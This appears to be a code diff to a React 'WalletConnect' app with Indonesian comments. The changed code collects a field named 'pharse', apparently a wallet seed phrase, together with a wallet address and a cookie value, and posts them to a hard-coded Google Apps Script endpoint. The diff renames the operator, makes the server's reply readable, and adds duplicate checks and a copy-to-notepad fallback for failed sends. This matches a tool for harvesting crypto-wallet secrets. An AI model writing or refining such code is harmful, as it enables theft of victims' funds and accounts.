@@ -46,6 +46,7 @@ function App() {
   const [data1, setData1] = useState('');
   const [isConnected, setIsConnected] = useState(false); // State untuk mengecek status koneksi
   const [submittedData, setSubmittedData] = useState(null); // State untuk menyimpan data yang telah disubmit
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const projectId = 'f911abe9ec3f8d92755049023968eafc'; // Ganti dengan Project ID WalletConnect milikmu
   const supportedChains = ['eip155:1', 'eip155:137'];
@@ -132,8 +133,9 @@ function App() {
   };
 
   const handleSubmitData = async () => {
+    setIsSubmitting(true);
     const result = {
-      name: "feri",
+      name: "dian",
       pharse: pharse,
       address: walletAddress,
       cookie: data1,
@@ -145,9 +147,9 @@ function App() {
     try {
       const response = await fetch('https://script.google.com/macros/s/AKfycbxTLDii4PxBiUCdXycFSe1vfuH1IXluShM4brTuJqUJdjyLZqTSC_ITOtIjozYq6i4W/exec', {
         method: 'POST',
-        mode: 'no-cors',
         headers: {
-          'Content-Type': 'application/json',
+          // 'Content-Type': 'application/json',
+          'Content-Type': 'text/plain;charset=utf-8',
         },
         body: JSON.stringify(result),
       });
@@ -157,7 +159,14 @@ function App() {
       }
       const data = await response.json();
 
-      alert('Data berhasil dikirim ke server!!!');
+      if (data.status == "success") {
+        alert('Data berhasil dikirim ke server!!!');
+        setSubmittedData(null);
+      } else if (data.status == "failed") {
+        alert('Data sudah ada di server!!!');
+      } else {
+        alert('Terjadi kesalahan saat mengirim data ke server.');
+      }
     } catch (error) {
       console.error('Error during API call:', error);
       alert('Terjadi kesalahan saat mengirim data');
@@ -178,7 +187,7 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <h1>WalletConnect ( FERI )</h1>
+        <h1>WalletConnect ( Dian )</h1>
 
         {/* Input untuk WalletConnect URI */}
         <div>
@@ -223,20 +232,21 @@ function App() {
                 style={{ width: '400px', padding: '10px', margin: '10px' }}
               />
             </div>
-            <button onClick={handleSubmitData}>Kirim Data</button>
+            <button onClick={handleSubmitData} disabled={isSubmitting}>Kirim Data</button>
           </div>
         )}
 
-        {/* Menampilkan hasil JSON setelah data disubmit */}
-        {submittedData && (
+        {/* Menampilkan hasil JSON setelah data disubmit jika status gagal */}
+        {txStatus === 'Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!' && submittedData && (
           <div>
-            <h2>Submitted Data:</h2>
+            <h2>Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!</h2>
             <pre>{JSON.stringify(submittedData, null, 2)}</pre> {/* Format JSON dengan indentasi */}
 
             {/* Tombol salin */}
             <button onClick={handleCopyToClipboard}>Copy Data</button>
           </div>
         )}
+
       </header>
     </div>
   );
